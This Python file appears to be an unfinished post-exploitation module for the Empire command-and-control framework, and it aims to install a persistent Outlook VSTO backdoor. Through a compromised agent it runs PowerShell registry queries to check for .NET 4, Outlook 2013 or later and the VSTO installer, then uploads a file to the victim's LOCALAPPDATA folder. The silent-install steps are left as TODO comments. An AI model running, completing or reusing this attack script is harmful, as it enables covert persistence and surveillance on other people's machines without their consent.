"""
Install Outlook VSTO backdoor. 
Backdoor requirements:
1. At least .NET 4 Client
2. At least Outlook 2013
3. VSTOinstaller
"""
from EmpireAPIWrapper import empireAPI
from empire_settings import EMPIRE_SERVER, EMPIRE_PWD, EMPIRE_USER

def run(API, agent_name):
    # check for .NET 4 client
    findDotNet = """Get-ChildItem 'HKLM:\\SOFTWARE\\Microsoft\\NET Framework Setup\\NDP' -recurse |
                    Get-ItemProperty -name Version,Release -EA 0 |
                    Where { $_.PSChildName -match '^(?!S)\\p{L}'} |
                    Select PSChildName, Version, Release"""
    opts = {'Agent': agent_name, 'command': findDotNet}
    if(" 4." not in API.agent_run_shell_cmd_with_result(agent_name, opts)):
        raise ValueError('No .NET 4 Client, cannot proceed')
    # check for Outlook version
    findOutlook = """Get-ChildItem 'HKCU:\\SOFTWARE\\Microsoft\\Office'"""
    opts['command'] = findOutlook
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if(not ("15.0" in results or "16.0" in results)):
        raise ValueError('Need at least Outlook 2013')
    # Get VSTO installer path
    opts['command'] = """Get-ChildItem -recurse 'HKLM:\\Software\\Microsoft\\VSTO Runtime Setup' | 
                         Get-ItemProperty | Select InstallerPath"""
    results = API.agent_run_shell_cmd_with_result(agent_name, opts)
    if(".exe" not in results):
        raise ValueError('No VSTOInstaller')
    VSTOinstallerpath = results[results.index("C:"):len(results)]
    # Get Local App Data path
    opts['command'] = '$env:LOCALAPPDATA'
    uploadpath = API.agent_run_shell_cmd_with_result(agent_name, opts)
    base64encodedcontent = "bG9sIHRoaXMgaXMgYSBsb2wgdGVzdA=="
    upload_opts = {"filename": uploadpath + "\\test.txt", "data":base64encodedcontent }
    API.agent_upload(agent_name, upload_opts)
    # todo1 merge registry for silent VSTO install
    # todo2 upload VSTO zip file LOCALAPPDATA 
    # todo3 unzip VSTO file
    # todo4 VSTOinstaller silent install
    return results
    

if __name__ == '__main__': # unit test
    API = empireAPI(EMPIRE_SERVER, uname=EMPIRE_USER, passwd=EMPIRE_PWD)
    print(run(API, API.agents()['agents'][0]['name']))